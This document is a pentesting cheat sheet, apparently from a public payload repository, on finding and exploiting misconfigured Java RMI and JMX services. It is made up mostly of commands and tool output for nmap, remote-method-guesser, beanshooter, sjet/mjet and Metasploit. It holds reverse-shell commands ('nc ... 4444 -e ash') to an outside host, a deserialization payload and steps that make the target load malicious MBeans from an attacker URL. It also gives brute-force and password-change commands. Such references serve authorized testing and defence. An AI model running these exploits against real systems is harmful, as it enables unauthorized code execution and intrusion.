# java rmi

> java rmi (remote method invocation) is a java api that allows an object running in one jvm (java virtual machine) to invoke methods on an object running in another jvm, even if they're on different physical machines. rmi provides a mechanism for java-based distributed computing.


## summary

* [tools](#tools)
* [detection](#detection)
* [methodology](#methodology)
    * [rce using beanshooter](#rce-using-beanshooter)
    * [rce using sjet/mjet](#rce-using-sjet-or-mjet)
    * [rce using metasploit](#rce-using-metasploit)
* [references](#references)


## tools

- [siberas/sjet](https://github.com/siberas/sjet) - siberas jmx exploitation toolkit
- [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - mogwai labs jmx exploitation toolkit
- [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - java rmi vulnerability scanner
- [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - jmx enumeration and attacking tool.


## detection

* using [nmap](https://nmap.org/):
  ```powershell
  $ nmap -sv --script "rmi-dumpregistry or rmi-vuln-classloader" -p target_port target_ip -pn -v
  1089/tcp open  java-rmi java rmi
  | rmi-vuln-classloader:
  |   vulnerable:
  |   rmi registry default configuration remote code execution vulnerability
  |     state: vulnerable
  |       default configuration of rmi registry allows loading classes from remote urls which can lead to remote code execution.
  | rmi-dumpregistry:
  |   jmxrmi
  |     javax.management.remote.rmi.rmiserverimpl_stub
  ```

* using [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser):
  ```bash
  $ rmg scan 172.17.0.2 --ports 0-65535
  [+] scanning 6225 ports on 172.17.0.2 for rmi services.
  [+] 	[hit] found rmi service(s) on 172.17.0.2:40393 (dgc)
  [+] 	[hit] found rmi service(s) on 172.17.0.2:1090  (registry, dgc)
  [+] 	[hit] found rmi service(s) on 172.17.0.2:9010  (registry, activator, dgc)
  [+] 	[6234 / 6234] [#############################] 100%
  [+] portscan finished.

  $ rmg enum 172.17.0.2 9010
  [+] rmi registry bound names:
  [+]
  [+] 	- plain-server2
  [+] 		--> de.qtc.rmg.server.interfaces.iplainserver (unknown class)
  [+] 		    endpoint: iinsecure.dev:39153 objid: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
  [+] 	- legacy-service
  [+] 		--> de.qtc.rmg.server.legacy.legacyserviceimpl_stub (unknown class)
  [+] 		    endpoint: iinsecure.dev:39153 objid: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]
  [+] 	- plain-server
  [+] 		--> de.qtc.rmg.server.interfaces.iplainserver (unknown class)
  [+] 		    endpoint: iinsecure.dev:39153 objid: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]
  [...]
  ```

* using [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
  ```bash
  use auxiliary/scanner/misc/java_rmi_server
  set rhosts <ips>
  set rport <port>
  run
  ```

## methodology

if a java remote method invocation (rmi) service is poorly configured, it becomes vulnerable to various remote code execution (rce) methods. one method involves hosting an mlet file and directing the jmx service to load mbeans from a distant server, achievable using tools like mjet or sjet. the remote-method-guesser tool is newer and combines rmi service enumeration with an overview of recognized attack strategies.


### rce using beanshooter

* list available attributes: `beanshooter info 172.17.0.2 9010`
* display value of an attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=memory verbose`
* set the value of an attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=memory verbose true --type boolean`
* bruteforce a password protected jmx service: `beanshooter brute 172.17.0.2 1090`
* list registered mbeans: `beanshooter list 172.17.0.2 9010`
* deploy an mbean: `beanshooter deploy 172.17.0.2 9010 non.existing.example.examplebean qtc.test:type=example --jar-file examplebean.jar --stager-url http://172.17.0.1:8000`
* enumerate jmx endpoint: `beanshooter enum 172.17.0.2 1090`
* invoke method on a jmx endpoint: `beanshooter invoke 172.17.0.2 1090 com.sun.management:type=diagnosticcommand --signature 'vmversion()'`
* invoke arbitrary public and static java methods: 

    ```ps1
    beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.file 'new java.io.file("/")'
    beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
    ```
    
* standard mbean execution: `beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`
* deserialization attacks on a jmx endpoint: `beanshooter serial 172.17.0.2 1090 commonscollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`


### rce using sjet or mjet

#### requirements

- jython
- the jmx server can connect to a http service that is controlled by the attacker
- jmx authentication is not enabled

#### remote command execution

the attack involves the following steps:
* starting a web server that hosts the mlet and a jar file with the malicious mbeans
* creating a instance of the mbean `javax.management.loading.mlet` on the target server, using jmx
* invoking the `getmbeansfromurl` method of the mbean instance, passing the webserver url as parameter. the jmx service will connect to the http server and parse the mlet file.
* the jmx service downloads and loades the jar files that were referenced in the mlet file, making the malicious mbean available over jmx.
* the attacker finally invokes methods from the malicious mbean.

exploit the jmx using [siberas/sjet](https://github.com/siberas/sjet) or [mogwailabs/mjet](https://github.com/mogwailabs/mjet)

```powershell
jython sjet.py target_ip target_port super_secret install http://attacker_ip:8000 8000
jython sjet.py target_ip target_port super_secret command "ls -la"
jython sjet.py target_ip target_port super_secret shell
jython sjet.py target_ip target_port super_secret password this-is-the-new-password
jython sjet.py target_ip target_port super_secret uninstall
jython mjet.py --jmxrole admin --jmxpassword adminpassword target_ip target_port deserialize commonscollections6 "touch /tmp/xxx"

jython mjet.py target_ip target_port install super_secret http://attacker_ip:8000 8000
jython mjet.py target_ip target_port command super_secret "whoami"
jython mjet.py target_ip target_port command super_secret shell
```

### rce using metasploit

```bash
use exploit/multi/misc/java_rmi_server
set rhosts <ips>
set rport <port>
# configure also the payload if needed
run
```


## references

- [attacking rmi based jmx services - hans-martin münch - april 28, 2019](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
- [jmx rmi - multiple applications rce - red timmy security - march 26, 2019](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
- [remote-method-guesser - bhusa 2021 arsenal - tobias neitzel - august 15, 2021](https://www.slideshare.net/tobiasneitzel/remotemethodguesser-bhusa2021-arsenal)